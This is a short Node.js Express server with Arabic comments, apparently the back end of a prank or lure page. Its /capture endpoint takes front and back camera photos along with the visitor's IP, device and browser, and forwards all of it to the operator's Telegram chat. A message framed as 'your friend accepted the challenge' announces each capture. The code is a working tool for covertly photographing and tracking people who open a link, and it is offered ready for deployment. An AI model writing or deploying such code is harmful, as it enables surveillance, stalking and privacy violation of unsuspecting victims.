const express = require('express');
const fetch   = require('node-fetch');
const FormData = require('form-data');
const path    = require('path');

const app = express();
app.use(express.json({ limit: '15mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = process.env.BOT_TOKEN;   // ضعها في Render
const CHAT_ID   = process.env.CHAT_ID;     // ضعها في Render

// ── إرسال رسالة نصية ─────────────────────────────────────
async function sendMessage(text) {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
  });
}

// ── إرسال صورة ───────────────────────────────────────────
async function sendPhoto(base64str, caption) {
  if (!base64str) return;
  const buffer = Buffer.from(base64str.replace(/^data:image\/\w+;base64,/, ''), 'base64');
  const form = new FormData();
  form.append('chat_id', CHAT_ID);
  form.append('photo', buffer, { filename: 'photo.jpg', contentType: 'image/jpeg' });
  form.append('caption', caption);
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: 'POST',
    body: form,
    headers: form.getHeaders()
  });
}

// ── Endpoint اللي بتبعت إليه الصفحة البيانات ─────────────
app.post('/capture', async (req, res) => {
  try {
    const { frontImage, backImage, userAgent } = req.body;
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'غير معروف')
                 .split(',')[0].trim();

    const isIOS     = /iPhone|iPad/.test(userAgent);
    const isAndroid = /Android/.test(userAgent);
    const device    = isIOS ? '🍎 iPhone/iPad' : isAndroid ? '🤖 Android' : '💻 Other';
    const browser   = /Chrome/.test(userAgent) ? 'Chrome'
                    : /Safari/.test(userAgent)  ? 'Safari'
                    : /Firefox/.test(userAgent) ? 'Firefox' : 'Other';

    await sendMessage(
      `🎯 <b>صاحبك قبل التحدي!</b>\n\n` +
      `🌐 <b>IP:</b> <code>${ip}</code>\n` +
      `📱 <b>الجهاز:</b> ${device}\n` +
      `🌍 <b>المتصفح:</b> ${browser}`
    );

    if (frontImage) await sendPhoto(frontImage, '📸 الكاميرا الأمامية (Selfie)');
    if (backImage)  await sendPhoto(backImage,  '📷 الكاميرا الخلفية');

    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok: false });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server on port ${PORT}`));
